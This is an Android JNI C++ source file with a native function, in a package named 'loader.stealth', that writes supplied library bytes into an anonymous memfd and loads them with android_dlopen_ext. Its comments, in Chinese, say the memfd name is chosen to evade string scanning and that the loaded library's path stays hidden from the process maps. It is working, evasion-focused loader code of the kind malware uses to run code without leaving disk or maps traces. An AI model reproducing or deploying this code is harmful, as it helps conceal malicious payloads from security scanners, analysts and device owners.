#include <jni.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/memfd.h>
#include <android/dlext.h>
#include <dlfcn.h>
#include <string>

extern "C" JNIEXPORT jstring JNICALL
Java_com_loader_stealth_NativeLoader_memfdInject(JNIEnv *env, jclass clazz, jbyteArray so_bytes) {
    jsize len = env->GetArrayLength(so_bytes);
    jbyte* data = env->GetByteArrayElements(so_bytes, nullptr);

    // 随机化 memfd 名称以规避字符串扫描
    std::string mem_name = "sys_mem_" + std::to_string(getpid());
    int fd = syscall(__NR_memfd_create, mem_name.c_str(), MFD_CLOEXEC);
    if (fd < 0) return env->NewStringUTF("FD_CREATE_FAILED");

    write(fd, data, len);
    env->ReleaseByteArrayElements(so_bytes, data, JNI_ABORT);

    android_dlextinfo extinfo;
    extinfo.flags = ANDROID_DLEXT_USE_LIBRARY_FD;
    extinfo.library_fd = fd;

    // 隐匿加载：Maps 中不显示路径
    void* handle = android_dlopen_ext("lib_anon.so", RTLD_NOW, &extinfo);
    close(fd);

    return (handle != nullptr) ? env->NewStringUTF("SUCCESS") : env->NewStringUTF(dlerror());
}
